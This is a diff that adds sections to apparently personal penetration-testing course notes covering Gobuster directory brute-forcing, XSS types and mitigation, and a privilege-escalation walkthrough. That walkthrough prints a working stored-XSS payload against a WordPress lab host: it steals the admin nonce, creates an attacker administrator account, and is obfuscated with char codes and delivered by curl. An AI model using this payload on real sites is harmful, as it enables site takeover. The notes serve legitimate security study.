@@ -3,6 +3,7 @@
   - [Other Design Principles](#other-design-principles)
 - [Linux Basics](#linux-basics)
   - [User Account Details](#user-account-details)
+    - [Tools to modify user accounts](#tools-to-modify-user-accounts)
   - [Permissions](#permissions)
   - [Logs](#logs)
   - [Disk Management](#disk-management)
@@ -19,6 +20,9 @@
   - [SysInternals Overview and psinfo](#sysinternals-overview-and-psinfo)
   - [Access Controls](#access-controls)
   - [Local Accounts and Groups](#local-accounts-and-groups)
+    - [Administrator](#administrator)
+    - [Guest](#guest)
+    - [SYSTEM](#system)
   - [User Account Control (UAC)](#user-account-control-uac)
   - [`runas` and `cmd /c`](#runas-and-cmd-c)
   - [NTFS Permissions](#ntfs-permissions)
@@ -36,10 +40,23 @@
   - [Basic Service Detection](#basic-service-detection)
   - [Using NSE Scripts](#using-nse-scripts)
   - [Advanced Fingerprinting](#advanced-fingerprinting)
+- [Directory Brute Forcing Gobuster](#directory-brute-forcing-gobuster)
+  - [Basic Usage](#basic-usage)
+  - [Searching for Specific File Types](#searching-for-specific-file-types)
+  - [Viewing Different Status Codes](#viewing-different-status-codes)
+  - [Increasing Speed with Threads](#increasing-speed-with-threads)
+  - [Specifying a User-Agent](#specifying-a-user-agent)
+  - [Supplying Patterns for API enumeration](#supplying-patterns-for-api-enumeration)
 - [Basic XSS and Testing](#basic-xss-and-testing)
+  - [Javascript Refresher](#javascript-refresher)
   - [Types of XSS](#types-of-xss)
+    - [1. Stored XSS (Persistent XSS)](#1-stored-xss-persistent-xss)
+    - [2. Reflected XSS (Non-Persistent XSS)](#2-reflected-xss-non-persistent-xss)
+    - [3. DOM-Based XSS](#3-dom-based-xss)
   - [Intermediate XSS Techniques](#intermediate-xss-techniques)
+  - [Identifying XSS Vulns](#identifying-xss-vulns)
   - [Mitigation](#mitigation)
+  - [Priv Esc via XSS](#priv-esc-via-xss)
 
 ## Introduction to PEN-100
 
@@ -495,15 +512,88 @@ Web server fingerprinting is the process of determining the type and version of 
 - For a more granular fingerprinting, you can use the `http-waf-detect` and `http-waf-fingerprint` scripts to identify the presence of software Web Application Firewall (WAF) and its type.
   - Example: `nmap --script http-waf-detect --script http-waf-fingerprint <target>`
 
+## Directory Brute Forcing Gobuster
+
+Gobuster is a powerful tool used for brute-forcing URIs (directories and files) in web sites, DNS subdomains, and even virtual host names on target web servers. 
+
+### Basic Usage
+
+The basic command for directory brute forcing with Gobuster is `gobuster dir -u http://targetwebsite.com -w /path/to/wordlist`
+
+In this command:
+- `-u` specifies the URL of the target.
+- `-w` specifies the path to the wordlist that Gobuster will use to brute force directories.
+
+### Searching for Specific File Types
+
+If you're looking for specific file types, you can use the `-x` option followed by the file extensions you want to search for, separated by commas. 
+
+`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -x txt,php,html`
+
+### Viewing Different Status Codes
+
+By default, Gobuster will only show directories that return a 200 status code. If you want to see directories that return other status codes, you can use the `-s` option followed by the status codes you're interested in.
+
+`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -s '200,204,301,302,307,401,403'`
+
+### Increasing Speed with Threads
+
+You can increase the speed of Gobuster by increasing the number of threads with the `-t` option.
+
+`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -t 50`
+
+### Specifying a User-Agent
+
+Some websites may block default user-agents, and in this case, you can use the `-a` option to specify a different user-agent.
+
+`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -a 'Mozilla/5.0'`
+
+### Supplying Patterns for API enumeration
+
+```
+# in a file called pattern
+
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+```
+
+`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`
+
 ## Basic XSS and Testing
 
 Cross-Site Scripting (XSS) is a type of injection security vulnerability typically found in web applications. XSS allows attackers to inject malicious scripts into webpages viewed by other users.
+
+Basically if inputs are not sanitized, they be vulnerable to XSS.
+
+### Javascript Refresher
+
+When a browser recieves a response from a server with a page that contains HTML, the borwser creates a [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) tree which contains all forms, inputs, images, etc. related to the web page.
+
+Javascript acts the middle man to access and modify the page's DOM which allows for an interactive user experience.
+
+More on DOM:
+
+- OM: The Document Object Model (DOM) is a programming interface for web documents. It represents a webpage as a tree structure of objects that can be manipulated using JavaScript.
+
+- DOM Tree Structure: The webpage is represented as a tree, with the Document node at the top. Each node represents a part of the document (elements, attributes, or text).
+
+- Nodes & Elements: Every item in the DOM is a node, and these nodes include elements, which represent HTML elements such as <p>, <div>, <img>, etc.
+
+- DOM Manipulation: JavaScript can interact with and modify the DOM. This allows dynamic updates to the content, structure, and style of a webpage.
+
+- Event Handling: The DOM allows for the handling of user events, such as clicks or keyboard input. JavaScript can define responses to these events.
+
+- Traversal: This refers to moving around the DOM tree, accessing and selecting different nodes based on their relationships (like parent, child, or sibling nodes).
+
+- DOM Methods: These are JavaScript functions used to interact with the DOM, such as getElementById(), getElementsByTagName(), createElement(), appendChild(), etc.
+
+From an attackers perspective, if we can inject Javascript code into the application, we could potentially modify the page's DOM. with access to the DOM, we can redirect login forms, extract password, and steal session cookies. 
 
 ### Types of XSS
 
 There are mainly three types of XSS:
 
-#### 1.Stored XSS (Persistent XSS)
+#### 1. Stored XSS (Persistent XSS)
 
 - This type of XSS vulnerability occurs when the data provided by the attacker is saved by the server and then permanently displayed on "normal" pages returned to users. 
 - For example, a comment on a blog post or a message on a forum that contains malicious script.
@@ -546,9 +636,157 @@ Each of these examples is designed to execute a simple alert function, but in a 
 - Using encoding to bypass filters, like URL encoding, HTML entity encoding, etc.
 - Using less common HTML tags that can contain JavaScript, such as `img`, `link`, `div`, `body`, `input`, `textarea`, `form`, `frameset`, `iframe`, etc.
 
+### Identifying XSS Vulns
+
+Idenityfing input fields such as search fields that accept sanitized input, which is then displayed as output in subsequent pages.
+
+Once we identify an entry point, we can input special chars and observe the output ot determine if any of the special chars return unfiltered.
+
+Most common special chars are: `< > ' " { } ;`
+
+- `< >` denote elements which are the various components that make up an HTML doc
+- `{ }` denote JS function declaration
+- `'` and `"` denote strings
+- `;` denote the end of a statement
+
+If the app doesn't sanitize (remove or encode) these, the app interprets these chars as code, which in turn enables additional code. **Encoding helps to prevent the above characters from being used to execute code**.
+
+Most common encodings we will encounter are HTML encoding and URL encoding.
+- URL encoding (also called percent encoding) is used to convert non-ASCII and reserved characters in URLs, such as converting a space to `%20`
+- HTML encoding (also called character references) `<` becomes `&lt;` and `>` becomes `&gt;`, which are displayed on the page as the literal characters `<` and `>`, not as HTML tags. 
+
+
+
 ### Mitigation
 
 - Input validation: Ensure that input is what you expect. For example, a field expecting a number doesn't need to accept letters or special characters.
 - Output encoding: Whenever output is generated dynamically and includes some form of user input, ensure it's properly encoded.
 - Use security headers: For example, the Content Security Policy (CSP) header can significantly reduce the risk of XSS attacks.
 - Use HttpOnly cookies: This attribute can prevent access to cookie values via JavaScript.
+
+### Priv Esc via XSS
+
+We could leverage our XSS to steal cookies1 and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.
+
+For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.
+
+In order to succeed with our attack angle, we need to cover another web application attack class.
+
+To develop this attack, we'll build a similar scenario as depicted by Shift8.5 First, we'll create a JS function that fetches the WordPress admin nonce.6
+
+The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent Cross-Site-Request-Forgery (CSRF)7 attacks.
+
+A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.
+
+The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.
+
+```html
+<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
+```
+
+To gather a nonce we could do something like this:
+
+```javascript
+// Create a new XMLHttpRequest object for making HTTP requests from JavaScript
+var ajaxRequest = new XMLHttpRequest();
+
+// Define the URL for the HTTP request. In this case, we're targeting the WordPress admin page for creating a new user
+var requestURL = "/wp-admin/user-new.php";
+
+// Create a regular expression that matches a certain pattern in the response text.
+// This pattern is looking for the `ser" value` attribute which typically holds the nonce (number used once) value in WordPress admin forms
+var nonceRegex = /ser" value="([^"]*?)"/g;
+
+// Initialize a request. This is using "GET" as the method, the previously defined URL, and false for synchronous request
+ajaxRequest.open("GET", requestURL, false);
+
+// Send the request to the server
+ajaxRequest.send();
+
+// Use the regular expression to find a match in the response text from the server
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+
+// If a match was found, it will be in the first index of the match array. This is the nonce value.
+var nonce = nonceMatch[1];
+
+```
+
+This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.
+
+Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.
+
+```javascript
+// This is a string of parameters to be sent in the body of the POST request.
+// The parameters include various details like the action to be taken ('createuser'), 
+// the nonce value obtained from the previous block of code, and the details of the new user to be created.
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+
+// Create a new XMLHttpRequest object for making HTTP requests from JavaScript.
+ajaxRequest = new XMLHttpRequest();
+
+// Initialize a request with "POST" as the method, the previously defined URL, and true for asynchronous request.
+ajaxRequest.open("POST", requestURL, true);
+
+// Set the content type of the HTTP request to 'application/x-www-form-urlencoded' which is standard for POST requests that are submitting form data.
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+// Send the request to the server with the parameters defined earlier.
+ajaxRequest.send(params);
+
+```
+
+In essence, this script is constructing and sending a POST request to create a new user on a WordPress site. The params variable contains the data necessary for creating a new user, including the user's login name, email, password, and role. The nonce that was obtained from the previous block of code is also included in the parameters to bypass the security measure protecting the form.
+
+To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it. Use something like JS Compress.
+
+To encode:
+
+```javascript
+// This function takes a string as input and returns a string of numbers
+// where each number is the ASCII code of the corresponding character in the input string.
+function encode_to_javascript(string) {
+    var input = string
+    var output = '';
+
+    // The for loop goes through each character in the input string.
+    for(pos = 0; pos < input.length; pos++) {
+        // The charCodeAt() method returns the ASCII code of the character at the specified index in the string.
+        // This code is added to the output string.
+        output += input.charCodeAt(pos);
+
+        // If the current character is not the last character in the string, a comma is added to the output string.
+        // This is to separate the ASCII codes in the output.
+        if(pos != (input.length - 1)) {
+            output += ",";
+        }
+    }
+
+    // The function returns the output string, which is a comma-separated list of ASCII codes representing the input string.
+    return output;
+}
+
+// The function is called with the string 'insert_minified_javascript' as the argument.
+let encoded = encode_to_javascript('insert_minified_javascript')
+
+// The result is printed to the console.
+console.log(encoded)
+```
+
+We would use this function in the browser console.
+
+Once we have copied the encoded string, we can insert it with the following curl command and launch the attack:
+
+```bash
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
+```
+
+We are proxying through burp.
+
+Everything seems correct, so let's forward the request by clicking Forward, then disabling Intercept.
+
+At this point, our XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.
+
+We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into `<script>` tags, so the browser cannot render any string from it.
+
+By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the Users menu on the left pane.
+
